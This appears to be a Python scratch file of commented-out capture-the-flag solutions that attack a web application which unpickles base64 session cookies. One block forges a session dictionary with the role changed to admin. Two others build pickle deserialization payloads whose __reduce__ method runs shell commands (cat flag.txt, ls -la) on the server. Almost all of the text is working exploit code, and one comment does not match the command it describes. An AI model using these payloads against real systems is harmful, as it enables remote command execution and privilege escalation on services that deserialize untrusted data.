# import pickle
# import base64

# original_session_data = {
#     'username': 'hritesh',
#     'role': 'user'
# }

# original_session_data['role'] = 'admin'
# pickled_data = pickle.dumps(original_session_data)
# encoded_data = base64.b64encode(pickled_data).decode('utf-8')

# print(encoded_data)

#####

# import pickle
# import base64
# import subprocess

# # Custom class to mimic a session with attributes
# class Session:
#     def __init__(self, username, role, file_content):
#         self.username = username
#         self.role = role
#         self.file_content = file_content

#     def get(self, key):
#         return getattr(self, key)

# class Exploit(object):
#     def __reduce__(self):
#         # Execute 'cat notes.txt' command and get the output
#         return (subprocess.check_output, (['cat', 'flag.txt'],))

# # Serialize the payload
# payload = pickle.dumps(Exploit())

# # Encode the serialized payload to base64 format
# encoded_payload = base64.b64encode(payload)

# # Output the encoded payload
# print(encoded_payload)

#####

# import pickle
# import base64
# import subprocess

# class Exploit(object):
#     def __reduce__(self):
#         # Use subprocess to execute the 'ls' command and capture output
#         return (subprocess.check_output, (['ls', '-la'],))

# # Serialize the payload
# payload = pickle.dumps(Exploit())

# # Encode the serialized payload to base64
# encoded_payload = base64.b64encode(payload)

# # Output the encoded payload
# print(encoded_payload.decode('utf-8'))

#####